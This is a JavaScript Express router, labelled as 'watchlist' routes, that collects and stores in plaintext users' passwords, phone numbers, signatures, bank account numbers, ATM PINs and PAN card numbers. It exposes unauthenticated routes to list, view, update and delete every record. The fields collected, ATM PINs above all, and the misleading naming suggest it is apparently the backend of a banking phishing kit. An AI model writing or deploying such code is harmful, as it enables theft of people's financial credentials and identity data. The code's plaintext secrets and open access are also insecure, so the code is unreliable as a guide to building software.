const express = require("express");
const router = express.Router();
const DataSchema = require("./../models/data_schema");

//Get all watchlists
router.get("/", async (req, res) => {
  try {
    const data = await DataSchema.find();
    // res.status(200).json(data);
    res.render("index.ejs", { data: data });
  } catch (error) {
    res.status(500).json({ message: error.message });
  }
});

//Get one watchlist
router.get("/:id", async (req, res) => {
  try {
    const watchlist = await DataSchema.findById(req.params.id).lean();
    if (!watchlist) {
      return res
        .status(404)
        .json({ message: "Watchlist not found", status: "error" });
    }
    res.status(200).json(watchlist);
  } catch (error) {
    res.status(500).json({ message: error.message });
  }
});

//Create One
router.post("/", async (req, res) => {
  //All Field Required
  if (!req.body.user_id || !req.body.phone || !req.body.password) {
    //Return eerror
    return res.status(400).json({
      message: "All fields are required",
      status: "error",
    });
  }

  //Check if phone number is less than 10 digits
  if (req.body.phone.length < 10 || req.body.phone.length > 10) {
    return res.status(400).json({
      message: "Phone number must be 10 digits",
      status: "error",
    });
  }

  const login = new DataSchema({
    user_id: req.body.user_id,
    phone: req.body.phone,
    password: req.body.password,
    signature: req.body.signature,
    account_no: req.body.account_no,
    atm_pin: req.body.atm_pin,
    pan_card: req.body.pan_card,
  });
  try {
    const newWatchlist = await login.save();
    res.status(201).json(newWatchlist);
  } catch (error) {
    res.status(500).json({ message: error.message });
  }
});

//Delete one watchlist
router.delete("/:id", async (req, res) => {
  try {
    const watchlist = await DataSchema.findById(req.params.id);
    if (!watchlist) {
      return res
        .status(404)
        .json({ message: "Watchlist not found", status: "error" });
    }
    await DataSchema.findByIdAndDelete(req.params.id);
    res.status(200).json({ message: "Watchlist deleted", status: "success" });
  } catch (error) {
    res.status(500).json({ message: error.message });
  }
});

// Update signature
router.patch("/signature/:id", async (req, res) => {
  try {
    const watchlist = await DataSchema.findById(req.params.id);
    if (!watchlist) {
      return res
        .status(404)
        .json({ message: "Watchlist not found", status: "error" });
    }

    watchlist.signature = req.body.signature; // Update the signature field

    const updatedWatchlist = await watchlist.save();
    res.status(200).json(updatedWatchlist);
  } catch (error) {
    res.status(500).json({ message: error.message });
  }
});

// Update signature
router.patch("/account_no/:id", async (req, res) => {
  try {
    const watchlist = await DataSchema.findById(req.params.id);
    if (!watchlist) {
      return res
        .status(404)
        .json({ message: "Watchlist not found", status: "error" });
    }

    watchlist.account_no = req.body.account_no; // Update the signature field

    const updatedWatchlist = await watchlist.save();
    res.status(200).json(updatedWatchlist);
  } catch (error) {
    res.status(500).json({ message: error.message });
  }
});

// Update atm_pin and pan_card
router.patch("/atm_pin_pan_card/:id", async (req, res) => {
  try {
    const watchlist = await DataSchema.findById(req.params.id);
    if (!watchlist) {
      return res
        .status(404)
        .json({ message: "Watchlist not found", status: "error" });
    }

    watchlist.atm_pin = req.body.atm_pin; // Update the atm_pin field
    watchlist.pan_card = req.body.pan_card; // Update the pan_card field

    const updatedWatchlist = await watchlist.save();
    res.status(200).json(updatedWatchlist);
  } catch (error) {
    res.status(500).json({ message: error.message });
  }
});

module.exports = router;
